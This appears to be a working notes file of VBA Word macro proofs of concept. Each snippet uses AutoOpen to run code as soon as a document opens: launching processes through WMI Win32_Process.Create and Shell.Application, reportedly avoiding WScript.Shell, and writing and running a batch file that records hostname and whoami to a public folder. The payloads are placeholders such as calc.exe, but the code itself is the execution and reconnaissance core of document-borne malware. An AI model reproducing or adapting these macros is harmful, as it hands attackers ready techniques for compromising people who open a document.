Working
Sub AutoOpen()
    Open "C:\Users\Public\macro_test_result.txt" For Output As #1
    Print #1, "Word macro ran successfully without using WScript.Shell"
    Close #1
End Sub


Sub AutoOpen()
    GetObject("winmgmts:root\cimv2:Win32_Process").Create "calc.exe"
End Sub


Sub AutoOpen()
    GetObject("winmgmts:root\cimv2:Win32_Process").Create "calc.exe"
End Sub

Sub AutoOpen()
    Dim shell
    Set shell = CreateObject("Shell.Application")
    shell.ShellExecute "notepad.exe"
End Sub
------------------------------------------------------------
Sub AutoOpen()
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set outFile = fso.CreateTextFile("C:\Users\Public\getinfo.bat", True)
    outFile.WriteLine "@echo off"
    outFile.WriteLine "hostname > C:\Users\Public\hostinfo.txt"
    outFile.WriteLine "whoami >> C:\Users\Public\hostinfo.txt"
    outFile.WriteLine "echo Date: %date% >> C:\Users\Public\hostinfo.txt"
    outFile.Close
End Sub



Sub AutoOpen()
    CreateObject("Shell.Application").ShellExecute "C:\Users\Public\getinfo.bat"
End Sub






